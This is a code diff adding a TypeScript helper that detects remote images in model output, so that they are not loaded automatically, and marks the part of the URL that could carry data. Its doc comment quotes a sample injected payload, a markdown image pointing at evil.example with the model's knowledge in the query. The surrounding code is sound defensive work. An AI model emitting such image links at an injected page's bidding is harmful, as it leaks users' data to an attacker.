@@ -29,6 +29,22 @@ export function safeImageSrc(src: string | undefined | null): string | undefined
   return undefined;
 }
 
+/**
+ * An image on the web (http or https), as what a person is shown before it is loaded. Such an image is never
+ * loaded by itself: model output chose its address, and a page the model read may have chosen it for the model
+ * ("![](https://evil.example/?d=<what it knows>)"). `carries` is the part of the address that can hold data.
+ */
+export function remoteImage(src: string | undefined | null): { url: string; host: string; carries?: string } | undefined {
+  const safe = safeImageSrc(src);
+  if (!safe || !/^https?:\/\//i.test(safe.replace(/[\u0000- ]/g, ''))) return undefined;
+  let u: URL;
+  try { u = new URL(safe.replace(/[\u0000- ]/g, '')); } catch { return undefined; }
+  const extra = `${u.search}${u.hash}`;
+  // A long path can hold data as well as a query can.
+  const carries = extra || (u.pathname.length > 120 ? u.pathname : '') || (u.username ? `${u.username}@` : '');
+  return { url: u.toString(), host: u.host, ...(carries ? { carries } : {}) };
+}
+
 /** True for a link that leaves the app (opened in the system browser, rel=noopener). */
 export function isExternal(url: string): boolean { return /^https?:\/\//i.test(url) || /^mailto:/i.test(url); }
 
